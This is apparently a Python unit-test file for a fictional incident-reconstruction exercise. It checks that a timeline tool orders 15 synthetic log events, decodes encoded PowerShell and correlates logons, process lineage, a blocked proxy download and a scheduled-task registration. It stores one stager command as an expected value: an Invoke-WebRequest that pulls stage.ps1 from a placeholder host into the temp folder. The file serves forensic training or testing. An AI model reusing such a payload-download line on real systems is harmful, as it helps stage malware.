"""Offline tests for the fictional IR-001 incident reconstruction."""
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools"))

from ir001_timeline import (  # noqa: E402
    decode_encoded_powershell, load_events, parse_time, summarize, to_markdown,
)

EXPECTED_SCRIPT = (
    "Invoke-WebRequest -Uri 'https://cdn-update.example.invalid/stage.ps1' "
    '-OutFile "$env:TEMP\\stage.ps1"'
)


class SimulatedIncidentCaseTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.events = load_events()
        cls.by_id = {row["event_id"]: row for row in cls.events}
        cls.summary = summarize(cls.events)

    def test_15_events_and_unique_ids(self):
        self.assertEqual(len(self.events), 15)
        self.assertEqual(len(self.by_id), 15)
        self.assertEqual(self.summary["synthetic_event_count"], 15)

    def test_timeline_is_chronological(self):
        stamps = [parse_time(row["timestamp_utc"]) for row in self.events]
        self.assertEqual(stamps, sorted(stamps))
        md = to_markdown(self.events)
        self.assertIn("| IR-007 | WindowsSecurity4688 |", md)
        self.assertIn("| IR-010 | Proxy |", md)

    def test_authentication_and_process_lineage_correlate(self):
        self.assertEqual(self.summary["authentication_failures_before_success"], 3)
        self.assertTrue(self.summary["logon_id_link"])
        self.assertTrue(self.summary["office_parent_link"])
        self.assertEqual(self.by_id["IR-007"]["process_id"], "5112")
        self.assertEqual(self.by_id["IR-006"]["process_id"], "4400")

    def test_encoded_content_matches_script_block(self):
        actual = decode_encoded_powershell(self.by_id["IR-007"]["details"])
        self.assertEqual(actual, EXPECTED_SCRIPT)
        self.assertTrue(self.summary["decoded_matches_scriptblock"])
        self.assertEqual(self.by_id["IR-008"]["details"], actual)

    def test_blocked_download_is_not_mistaken_for_no_exposure(self):
        self.assertTrue(self.summary["blocked_proxy_request_observed"])
        self.assertTrue(self.summary["script_file_not_found_at_query"])
        self.assertFalse(self.summary["payload_execution_confirmed"])

    def test_persistence_is_registration_not_execution(self):
        self.assertTrue(self.summary["task_registration_observed"])
        self.assertFalse(self.summary["task_execution_confirmed"])
        self.assertTrue(self.summary["other_host_task_is_unrelated"])
        self.assertEqual(self.by_id["IR-012"]["host"], "LAB-WIN08")

    def test_scope_and_reserved_domains(self):
        delivered = [e for e in self.events if e["source"] == "EmailGateway"]
        self.assertEqual(len(delivered), 2)
        self.assertNotEqual(delivered[0]["account"], delivered[1]["account"])
        self.assertIn("example.invalid", EXPECTED_SCRIPT)
        self.assertIn("203.0.113.91", {e["source_ip"] for e in self.events})


if __name__ == "__main__":
    unittest.main()
